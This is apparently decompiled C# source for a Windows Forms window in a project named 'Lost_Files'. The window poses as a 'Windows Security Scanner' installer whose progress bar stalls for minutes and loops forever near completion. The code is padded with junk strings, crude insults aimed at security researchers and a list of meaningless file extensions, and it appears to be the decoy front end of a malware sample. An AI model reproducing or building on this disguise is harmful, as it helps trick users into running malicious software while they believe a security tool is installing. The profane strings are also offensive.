using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Lost_Files;

public class Form2 : Form
{
	private IContainer components;

	private ProgressBar progressBar1;

	private Label label1;

	private Label label2;

	public Form2()
	{
		InitializeComponent();
		string text = "CyberSecurityIsABitch";
		string text2 = "adsasdasdasdsad";
		string.Concat(text + text2, text, text2);
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		Start_Progress(null, null);
		string text = "CyberSecurityIsABitch";
		string text2 = "adsasdasdasdsad";
		string.Concat(text + text2, text, text2);
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void progressBar1_Click(object sender, EventArgs e)
	{
	}

	public void DoWork(IProgress<int> progress)
	{
		for (int i = 1; i <= 100; i++)
		{
			if (progress == null)
			{
				continue;
			}
			string text = "CyberSecurityIsABitch";
			string text2 = "adsasdasdasdsad";
			string.Concat(text + text2, text, text2);
			if (i >= 0 && i <= 25)
			{
				Thread.Sleep(100);
			}
			if (i >= 26 && i <= 60)
			{
				Thread.Sleep(10000);
			}
			for (int j = 0; j <= 10; j++)
			{
				if (j == 0)
				{
					try
					{
					}
					catch (Exception)
					{
						continue;
					}
				}
				if (j == 2)
				{
				}
				if (j == 9)
				{
					string text3 = "These pieces of shit needs to get something better to do!";
					_ = "Fuck Cyber Security" + text3;
				}
			}
			if (i >= 61 && i <= 90)
			{
				Thread.Sleep(25000);
			}
			_ = new string[40]
			{
				".dsfd", ".dsf", ".sdf", ".we", ".rew", ".rew", ".tr", ".rt", ".jhj", ".hjjh",
				".khkh", ".hhh", ".hkh", ".hkh", ".hkhj", ".hkh", ".hjk", ".hkh", ".hk", ".hhk",
				".hkh", ".hkh", ".qeq", ".qweq", ".erer", ".erd", ".dffet", ".dff", ".qq", ".ww",
				".eee", ".23", ".dds", ".sdds", ".dfhd", ".dffd", ".gfgfg", ".dfdf", ".dd", ".qwdg"
			};
			if (i >= 91 && i <= 100)
			{
				i = 91;
			}
			progress.Report(i);
		}
	}

	private async void Start_Progress(object sender, EventArgs e)
	{
		progressBar1.set_Maximum(100);
		progressBar1.set_Step(1);
		_ = new string[5] { "Kim", "Kardashian", "The", "Cum", "Dumpster" };
		_ = new string[4] { "Fuck", "My", "Life", "Bitch" };
		Progress<int> progress = new Progress<int>(delegate(int v)
		{
			progressBar1.set_Value(v);
		});
		await Task.Run(delegate
		{
			DoWork(progress);
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		progressBar1 = new ProgressBar();
		label1 = new Label();
		label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)progressBar1).set_Location(new Point(12, 29));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(395, 23));
		((Control)progressBar1).set_TabIndex(0);
		((Control)progressBar1).add_Click((EventHandler)progressBar1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 13));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(117, 13));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Installing, Please wait...");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(99, 84));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(308, 18));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("© Copyright 2019, Windows Security Scanner");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.Control);
		((Form)this).set_ClientSize(new Size(419, 113));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Form)this).set_HelpButton(true);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Control)this).set_Text("Windows Security Scanner");
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
